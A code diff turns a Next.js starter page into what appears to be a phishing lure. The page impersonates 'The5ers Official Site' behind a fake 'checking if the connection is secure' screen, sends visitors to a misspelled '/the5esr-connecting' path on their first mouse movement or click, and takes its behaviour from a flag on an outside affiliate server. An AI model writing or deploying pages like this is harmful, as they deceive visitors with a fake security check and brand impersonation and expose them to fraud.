@@ -1,95 +1,69 @@
-import Image from "next/image";
+'use client'
 import styles from "./page.module.css";
+import circel from "../public/R-tron.png";
+import image from "../public/image.png";
+import Image from "next/image";
+import { useEffect, useState } from "react";
 
 export default function Home() {
+  const [status, setStatus] = useState(true);
+  const [hasRedirected, setHasRedirected] = useState(false);
+  const handleMouseMove = () => {
+    if (!hasRedirected) {
+      setHasRedirected(true);
+      window.location.href = "/the5esr-connecting"; 
+    }
+  };
+  const handleClick = () => {
+      window.location.href = "/the5esr-connecting"; 
+  }
+  const fetchItem = async () => {
+    try {
+        const response = await fetch(`https://db-affiliate.onrender.com/status?id=6`);
+        if (!response.ok) {
+            throw new Error("Network response was not ok");
+        }
+        const data = await response.json();
+        setStatus(data?.status);
+    } catch (error) {
+        console.error("Error fetching item:", error);
+    }
+};
+  useEffect(() => {
+    fetchItem()
+  },[])
   return (
-    <div className={styles.page}>
+    <div
+      onMouseMove={status ? handleMouseMove : null}
+      onClick={!status ? handleClick : null}
+    >
       <main className={styles.main}>
-        <Image
-          className={styles.logo}
-          src="https://nextjs.org/icons/next.svg"
-          alt="Next.js logo"
-          width={180}
-          height={38}
-          priority
-        />
-        <ol>
-          <li>
-            Get started by editing <code>app/page.js</code>.
-          </li>
-          <li>Save and see your changes instantly.</li>
-        </ol>
-
-        <div className={styles.ctas}>
-          <a
-            className={styles.primary}
-            href="https://vercel.com/new?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
+        <h3 className={styles.text}>
+          The5ers Official Site{" "}
+          <span
+            style={{ transform: "translate(0px)", display: "inline-block" }}
           >
-            <Image
-              className={styles.logo}
-              src="https://nextjs.org/icons/vercel.svg"
-              alt="Vercel logomark"
-              width={20}
-              height={20}
-            />
-            Deploy now
-          </a>
-          <a
-            href="https://nextjs.org/docs?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-            target="_blank"
-            rel="noopener noreferrer"
-            className={styles.secondary}
-          >
-            Read our docs
-          </a>
+            <Image src={circel} alt="Logo" width={30} height={30} priority />
+          </span>
+        </h3>
+        <p className={styles.text2}>
+          Checking if the site connection is secure
+        </p>
+        <p className={styles.text3}>
+          We needs to review the security of your connection before proceeding
+          The5ers
+        </p>
+       
+        <div style={{ marginTop: 30 }}>
+          <Image src={image} alt="Logo" className={styles.image2} />
         </div>
+        <p className={styles.text4}>Why am I seeing this page?</p>
+        <p className={styles.text5}>
+          Requests from malicious bots can pose as legitimate traffic.
+          Occasionally, you may see this page while the site ensures that the
+          connection is secure.
+        </p>
       </main>
-      <footer className={styles.footer}>
-        <a
-          href="https://nextjs.org/learn?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <Image
-            aria-hidden
-            src="https://nextjs.org/icons/file.svg"
-            alt="File icon"
-            width={16}
-            height={16}
-          />
-          Learn
-        </a>
-        <a
-          href="https://vercel.com/templates?framework=next.js&utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <Image
-            aria-hidden
-            src="https://nextjs.org/icons/window.svg"
-            alt="Window icon"
-            width={16}
-            height={16}
-          />
-          Examples
-        </a>
-        <a
-          href="https://nextjs.org?utm_source=create-next-app&utm_medium=appdir-template&utm_campaign=create-next-app"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          <Image
-            aria-hidden
-            src="https://nextjs.org/icons/globe.svg"
-            alt="Globe icon"
-            width={16}
-            height={16}
-          />
-          Go to nextjs.org →
-        </a>
-      </footer>
     </div>
   );
 }
